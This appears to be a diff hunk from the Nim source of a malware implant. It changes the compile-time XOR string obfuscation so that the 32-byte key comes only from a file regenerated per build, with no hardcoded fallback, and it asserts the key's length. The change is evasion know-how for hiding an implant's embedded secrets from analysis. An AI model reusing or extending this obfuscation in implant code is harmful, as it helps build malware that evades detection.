@@ -289,13 +289,16 @@ proc getSystemInfo(): JsonNode =
 # the next 16 are the IV. We just use the 32-byte block differently
 # (key from first 16, derived IV from last 16 XOR'd with the
 # per-string counter).
-when staticExec("if exist xorkey.nim echo yes") == "yes":
-  include "xorkey.nim"
-else:
-  const XorKey: array[32, byte] = [byte 0x5A, 0xA5, 0x3C, 0xC3, 0x7E, 0xE7, 0x1F, 0xF1,
-                                              0x6B, 0xB6, 0x4D, 0xD4, 0x29, 0x92, 0x8A, 0xA8,
-                                              0xC4, 0x37, 0x8E, 0xF1, 0x52, 0xAB, 0x6C, 0x91,
-                                              0xD3, 0x04, 0x76, 0xB8, 0x1F, 0x5A, 0x2C, 0x9E]
+# The build script (build_hardened.ps1) regenerates the 32-byte key
+# at the repo root before each compile and deletes it afterwards.
+# There is deliberately NO hardcoded fallback: if the file is missing
+# or has the wrong length (e.g. a leftover 16-byte baseline key) the
+# build fails loudly instead of silently producing an implant whose
+# decoded secrets are garbage.
+include "../xorkey.nim"
+static:
+  doAssert XorKey.len == 32,
+    "xorkey.nim must define a 32-byte XorKey for hardened builds"
 
 # Compile-time counter for per-string nonces. Each call to
 # encodeObf() bumps this. Stored as a const at the end of the
